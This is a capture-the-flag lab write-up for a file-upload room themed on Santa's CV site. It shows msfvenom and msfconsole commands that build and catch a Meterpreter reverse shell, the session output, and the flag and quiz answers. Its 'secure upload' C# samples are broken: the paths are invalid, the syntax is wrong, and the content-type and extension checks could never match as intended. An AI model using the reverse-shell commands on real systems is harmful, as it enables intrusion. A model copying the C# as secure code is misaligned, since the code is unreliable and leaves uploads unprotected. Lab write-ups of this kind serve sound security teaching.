# Day_15 [Secure-Coding] Santa is looking for a Sidekick

+ Deployable Website: Yes
+ Deployable Container: Yes

Description: Santa is looking to hire new staff for his security team and has hired a freelance developer to create a web application where potential candidates can upload their CVs. Elf McSkidy is aware that third-party risks can be serious and has tasked you, Exploit McRed, with testing this application before it goes live. Since the festivities are right around the corner, we will have to focus on the core feature of the website, namely the ability to upload a CV. Elf McSkidy has provided you with the latest version of the application. Start the machine attached to this task to load the website.

> IP: 10.10.170.10

## LEARNING OBJECTIVES

+ Input validation of file upload funtionality
+ Unrestricted file upload vulnerabilities
+ Phishing through file uploads
+ How to properly secure file upload functionality

## NOTES

+ Input Validation
  + Insufficient input validation is one of the biggest security concerns for web applications. The issue occurs when user-provided input is inherently trusted by the application. Since user input can also be controlled by an attacker, we can see how this inherent trust can lead to many problems. Several web application vulnerabilities, such as SQL Injection, Cross Site Scripting, and Unrestricted File Upload, stem from the issue of insufficient user input validation. This task will focus on how insufficient input validation can lead to an Unrestricted File Upload vulnerability.
+ Unrestricted File Uploads
  + The ability to upload files to a server has become integral to how we interact with web applications. Just think of file uploads like a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on GitHub; the applications for file upload features are limitless.
  + Unfortunately, when poorly handled, file uploads can also open up severe vulnerabilities in the server. This can lead to anything from relatively minor nuisance problems; all the way up to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. With unrestricted upload access to a server (and the ability to retrieve data at will), an attacker could deface or otherwise alter existing content -- up to and including injecting malicious webpages, which lead to further vulnerabilities such as Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF). By uploading arbitrary files, an attacker could potentially use the server to host and/or serve illegal content or to leak sensitive information. Realistically speaking, an attacker with the ability to upload a file of their choice to your server -- with no restrictions -- is very dangerous indeed.
+ Unrestricted File Uploads usually have two main exploitation paths:
  1. If the attacker can retrieve the uploaded file, it could lead to code execution if the attacker uploads a file such as a web shell.
  2. If the file is viewed by a user, think of a CV application, then an attacker could embed malware in the uploaded file that would execute on the user's workstation once they view the file.

+ If we could upload any file that we wanted, we could upload one of these special types of pages, like an ASPX webshell. If this file was stored in the web root, we could request the file from the server, forcing the server to execute the code within our file before sending the response. It would be possible to get remote code execution on the web server. However, as the file is stored outside of the web root, we cannot make a request that would retrieve our uploaded file for execution. However, this protection is not sufficient for two main reasons:
   1. Other vulnerabilities, such as local file inclusion, may exist that allow us to force the web server itself to recover the file that was stored outside the web root. If the web server recovers the file, the code within the file will again be executed, allowing for RCE.
   2. While we cannot perhaps get RCE using this vulnerability, we know with certainty that actual users would interact with the files that we upload. Rather than targeting the web server directly, we could target the users that would interact with these files. If we were to upload a file that had malware embedded, it would execute when the user interacted with the file, still allowing us to breach Santa's perimeter!

## CODE EXAMPLE (For this example we will use C#)

+ Properly Securing File Uploads

1. Lets start with our base upload function

   ```C#
      public IActionResult OnPostUpload(FileUpload fileUpload)
         {   
            var fullPath = "D:\CVUploads\";
            var formFile = fileUpload.FormFile;
            var filePath = Path.Combine(fullPath, formFile.FileName);

            using (var stream = System.IO.File.Create(filePath))
                  {
                     formFile.CopyToAsync(stream);
                  }
         }
   ```

2. File Content Validation
   1. Now lets add the ability to filter based on content
   2. This only allows for content to be PDF

   ```C#
      string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
      if !(contentType.equals("ContentType=PDF")
         {
            allowed = False;
         }
   ```

3. File Extension Validation
   1. Now lets add the ability to filter by file type (based on file extension)
   2. This only allows .PDF extensions

   ```C#
      string contentExtension = Path.GetExtension(fileUpload);
      if !(contentExtension.equals("PDF"))
         {
            allowed = False;
         }
   ```

4. File Size Validation
   1. Now limit the file size
   2. If the file is too large it is not accepted

   ```C#
      int contentSize = fileUpload.ContentLength;
      //10Mb max file size
      int maxFileSize = 10 * 1024 * 1024
      if (contentSize > maxFileSize)
         {
            allowed = False;
         }
   ```

5. File Renaming
   1. Now lets rename the file so an attacker cant easily call the file they know when they uploaded

   ```C#
      Guid id = Guid.NewGuid();
      var filePath = Path.Combine(fullPath, id + ".pdf");
   ```

6. Malware Scanning
   1. Finally lets scan for malware
   2. Scan the file and make sure it passes a virus scan before upload

   ```C#
      var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
      var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
      
      if (scanResult.Result == ClamScanResults.VirusDetected)
         {
            allowed = False;
         }; 
   ```

7. PUT IT ALL TOGETHER

   ```C#
      public IActionResult OnPostUpload(FileUpload fileUpload)
         {
            var allowed = True;

            //Store file outside the web root   
            var fullPath = "D:\CVUploads\";

            var formFile = fileUpload.FormFile;

            //Create a GUID for the file name
            Guid id = Guid.NewGuid();
            var filePath = Path.Combine(fullPath, id + ".pdf");

            //Validate the content type
            string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
            if !(contentType.equals("ContentType=PDF")
               {
                  allowed = False;
               }

            //Validate the content extension
            string contentExtension = Path.GetExtension(fileUpload);
            if !(contentExtension.equals("PDF"))
               {
                  allowed = False;
               }

            //Validate the content size
            int contentSize = fileUpload.ContentLength;
            //10Mb max file size
            int maxFileSize = 10 * 1024 * 1024
            if (contentSize > maxFileSize)
               {
                  allowed = False;
               }

            //Scan the content for malware
            var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
            var scanResult = await clam.SendAndScanFileAsync(fileBytes);  

            if (scanResult.Result == ClamScanResults.VirusDetected)
               {
                  allowed = False;
               };

            //Only upload if all checks are passed
            if (allowed)
               {
                  using (var stream = System.IO.File.Create(filePath))
                     {
                        formFile.CopyToAsync(stream);
                     }
               }
         }
   ```

8. All of these controls are required for the simple reason that we cannot inherently trust user input.

## STEPS

1. Start machine
2. Navigate to website
3. Upload a test PDF
   1. Create test PDF
   2. Upload
      1. RESULTS: "test.pdf CV file uploaded!! Santa's team will review your CV and get in touch! Since Santa believes in Strong Security, the file has been stored outside the web root. No unethical elves allowed!"
   3. From this upload we can see the message that the uploaded file is not stored in the web root!
4. Upload a NON-PDF file
   1. Create test EXE
   2. Upload
      1. RESULTS: "test.exe CV file uploaded!! Santa's team will review your CV and get in touch! Since Santa believes in Strong Security, the file has been stored outside the web root. No unethical elves allowed!"
   3. From this we can see that the extension did not affect the upload ability
   4. Since we can upload any file lets try and upload something that could execute code
5. MSFVENOM
   1. Lets create a payload that will have a reverse shell
      1. > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="9999" -f exe -o payload.exe
      2. This will create a reverse_tcp payload listening on port 9999
   2. Lets now create a listener
      1. > sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT '9999'; exploit"
      2. This will execute a listener on the port we specified earlier in our payload (9999)
   3. Upload our payload and our listener should catch it
      1. "Meterpreter session 1 opened (MY_IP:9999 -> 10.10.170.10:49887) at 2022-12-15 10:43:33 -0800"
      2. Success!
6. METERPETER
   1. > sysinfo

      ```text
         Computer        : SANTASIDEKICK
         OS              : Windows 2016+ (10.0 Build 17763).
         Architecture    : x64
         System Language : en_US
         Domain          : WORKGROUP
         Logged On Users : 3
         Meterpreter     : x64/windows
      ```

   2. > pwd
      1. C:\Windows\system32
   3. > cd C:\\Users
   4. > ls
      1. Admin, All_Users, Default, Default_User, HR_Elf, Public, Desktop.ini
   5. > cd HR_Elf\\
   6. > cd Documents\\
   7. > ls
      1. flag.txt
   8. > cat flag.txt
      1. `THM{Naughty.File.Uploads.Can.Get.You.RCE}`

## QUESTIONS

1. What is the name given to file uploads that allow threat actors to upload any files that they want?
   1. `Unrestricted`
2. What is the title of the web application developed by Santa's freelancer?
   1. `SantaSideKick2`
3. What is the value of the flag stored in the HR Elf's Documents directory?
   1. `THM{Naughty.File.Uploads.Can.Get.You.RCE}`
4. What defence technique can be implemented to ensure that specific file types can be uploaded?
   1. `File Extension Validation`
5. What defence technique can be used to make sure the threat actor cannot recover their file again by simply using the file name?
   1. `File Renaming`
6. What defence technique can be used to make sure malicious files that can hurt elves are not uploaded?
   1. `Malware Scanning`
